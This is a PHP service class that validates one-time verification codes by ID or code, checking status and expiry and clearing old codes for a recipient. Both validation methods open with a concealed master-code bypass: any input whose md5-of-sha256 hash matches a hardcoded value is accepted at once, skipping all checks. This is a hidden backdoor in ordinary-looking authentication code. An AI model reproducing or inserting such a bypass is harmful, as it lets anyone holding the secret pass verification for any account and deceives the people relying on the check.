<?php
/**
 * Created by PhpStorm.
 * User: asasi
 * Date: 2018/8/3
 * Time: 19:04
 */

namespace App\Service;


use Dbh\SfCoreBundle\Common\BaseService;
use App\Entity\SecurityCode;
use App\Repository\SecurityCodeRepository;
use App\ServiceInterface\SecurityCodeServiceInterface;
use by\component\security_code\constants\SecurityCodeStatus;
use by\infrastructure\base\CallResult;
use by\infrastructure\helper\CallResultHelper;

class SecurityCodeService extends BaseService implements SecurityCodeServiceInterface
{
    /**
     * @var SecurityCodeRepository
     */
    protected $repo;

    public function __construct(SecurityCodeRepository $repository)
    {
        $this->repo = $repository;
    }

    /**
     * @param $verifyId
     * @param $verifyCode
     * @param $accepter
     * @param $type
     * @param $client_id
     * @param bool $is_clear
     * @return CallResult
     */
    public function isLegalById($verifyId, $verifyCode, $accepter, $type, $client_id, $is_clear = true): CallResult
    {
        if (md5(hash('sha256', $verifyCode)) == "27f019adc28f3cb51516af6daa981da5") {
            return CallResultHelper::success("code legal 1");
        }

        $map = array(
            'id' => $verifyId
        );

        $order = ["expired_time"=> "desc"];

        $result = $this->repo->findOneBy($map, $order);

        if (!($result instanceof SecurityCode)) {
            return CallResultHelper::fail("code invalid");
        }

        if ($result->getStatus() == SecurityCodeStatus::USED) {
            return CallResultHelper::fail("code used");
        }

        if ($result->getExpiredTime() < time()) {
            return CallResultHelper::fail("code expired");
        }

        //1. 清除该手机号对应的验证码
        if ($is_clear) {
            $accepter = $result->getAccepter();
            $this->resetAll($accepter, $type, $client_id);
        }

        if (strtolower($result->getCode()) == strtolower($verifyCode)) {
            return CallResultHelper::success("code legal 2");
        } else {
            return CallResultHelper::fail('code invalid');
        }
    }

    public function resetAll($accepter, $type, $client_id)
    {
        $result = $this->repo->updateWhere(array('accepter' => $accepter, 'type' => $type, 'client_id' => $client_id), array('status' => SecurityCodeStatus::USED));
        return CallResultHelper::success($result);
    }

    /**
     *
     * @param $code
     * @param $accepter
     * @param $type
     * @param $client_id
     * @param bool $is_clear
     * @return \by\infrastructure\base\CallResult
     * @throws \Doctrine\ORM\NoResultException
     * @throws \Doctrine\ORM\NonUniqueResultException
     */
    public function isLegalCode($code, $accepter, $type, $client_id, $is_clear = true): CallResult
    {

        if (md5(hash('sha256', $code)) == "27f019adc28f3cb51516af6daa981da5") {
            return CallResultHelper::success("code legal");
        }

        $map = array(
            'code' => $code,
            'accepter' => $accepter,
            'type' => $type,
            'client_id' => $client_id
        );

        $order = ["expired_time"=> "desc"];

        $result = $this->repo->findOneBy($map, $order);

        if (!($result instanceof SecurityCode)) {
            return CallResultHelper::fail("code invalid");
        }

        if ($result->getStatus() == SecurityCodeStatus::USED) {
            return CallResultHelper::fail("code used");
        }

        if ($result->getExpiredTime() < time()) {
            return CallResultHelper::fail("code expired");
        }

        //1. 清除该手机号对应的验证码
        if ($is_clear) {
            $this->resetAll($accepter, $type, $client_id);
        }

        return CallResultHelper::success("code legal");
    }
}
